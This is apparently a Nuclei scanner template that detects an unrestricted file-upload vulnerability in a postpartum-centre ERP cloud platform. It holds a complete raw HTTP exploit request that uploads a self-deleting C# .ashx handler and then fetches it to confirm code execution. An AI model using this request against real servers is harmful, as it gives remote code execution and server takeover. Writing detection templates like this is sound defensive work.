id: yzhs-erp-AttachedHandler-upload
info:
  name: Template Name
  author: wangzong
  severity: critical
  description: 月子会ERP管理云平台是由武汉金同方科技有限公司研发团队结合行业月子中心相关企业需求开发的一套综合性管理软件，管控月子中心经营过程中各个环节。由于未对上传文件进行任何过滤，可上传任意文件，攻击者可利用该漏洞获取服务器控制权。
  reference:
    - http://kpanda.wiki/#/Vulnhub/Y11-9%E6%9C%88%E5%AD%90%E4%BC%9A-ERP%E7%AE%A1%E7%90%86%E4%BA%91%E5%B9%B3%E5%8F%B0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0?id=y11-9%e6%9c%88%e5%ad%90%e4%bc%9a-erp%e7%ae%a1%e7%90%86%e4%ba%91%e5%b9%b3%e5%8f%b0-%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0
  tags: tags
http:
  - raw:
      - |
        POST /Page/upload/AttachedHandler.ashx?url=/UploadBaseFolder/ERP&Type=0 HTTP/1.1
        Content-Type: multipart/form-data; boundary=00content0boundary00
        User-Agent: Java/1.8.0_301
        Host: {{Hostname}}
        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
        Content-Length: 119
        Connection: close

        --00content0boundary00
        Content-Disposition: form-data; name="file"; filename="1.ashx"

        <%@ webhandler language="C#" class="AverageHandler" %> using System; using System.Web; using System.IO; public class AverageHandler : IHttpHandler { public bool IsReusable => true; public void ProcessRequest(HttpContext ctx) { ctx.Response.Write("whoisceshi"); string filePath = ctx.Server.MapPath(ctx.Request.FilePath); if (File.Exists(filePath)) { File.Delete(filePath); } } }
        --00content0boundary00--
      - |+
        GET //UploadBaseFolder/ERP/{{filename}} HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: body
        words:
          - whoisceshi
    extractors:
      - type: regex
        name: filename
        internal: true
        part: body
        regex:
          - '(\d{21})\.ashx'